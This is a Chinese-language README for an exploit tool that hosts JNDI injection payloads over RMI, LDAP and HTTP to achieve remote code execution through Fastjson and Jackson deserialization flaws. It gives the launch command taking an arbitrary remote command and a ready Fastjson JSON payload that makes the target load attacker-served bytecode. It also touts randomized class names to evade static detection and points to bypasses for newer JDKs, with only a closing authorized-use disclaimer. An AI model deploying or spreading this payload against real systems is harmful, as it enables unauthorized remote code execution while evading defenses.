# JNDI-Injection-Exploit (JNDI 注入利用工具)

这是一个集成了 RMI, LDAP 和 HTTP 服务的漏洞利用工具，专门用于生成和托管用于 JNDI 注入测试的 Payload。适用于验证 Fastjson, Jackson 等框架的反序列化漏洞。

## ✨ 核心特性
1.  **自动化链路**: 将 JNDI Server (RMI/LDAP) 与 HTTP Server 绑定，自动下发经过修改的恶意 `.class` 字节码。
2.  **动态编译**: 内置 ASM 框架，根据传入的命令动态生成字节码，无需手动编译多次。
3.  **多协议支持**: 同时开启 RMI (1099), LDAP (1389), Jetty (8180) 端口。
4.  **特征模糊化**: 生成随机化的 Class Name 以绕过部分静态特征检测。

## 🛠️ 使用指南

### 启动工具
```bash
java -jar JNDI-Injection-Exploit.jar -C "[命令]" -A "[服务器地址]"
```
- **-C**: 远程执行的命令（可选，默认为弹出 Mac 计算器）。
- **-A**: 服务器 IP 或域名（默认为本地第一网卡地址）。

### 链路注入示例
将工具生成的链接注入漏洞点：
```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://127.0.0.1:1099/RandomName",
  "autoCommit": true
}
```

## 🏗️ 构建与安装
要求: JDK 1.8+, Maven 3.x+
```bash
git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
cd JNDI-Injection-Exploit
mvn clean package -DskipTests
```

---
> [!CAUTION]
> 本工具仅供授权的安全测试使用。在不受支持的旧版本 JDK 中效果最佳；对于高版本 JDK 限制逻辑，请参考相关的绕过技术研究。
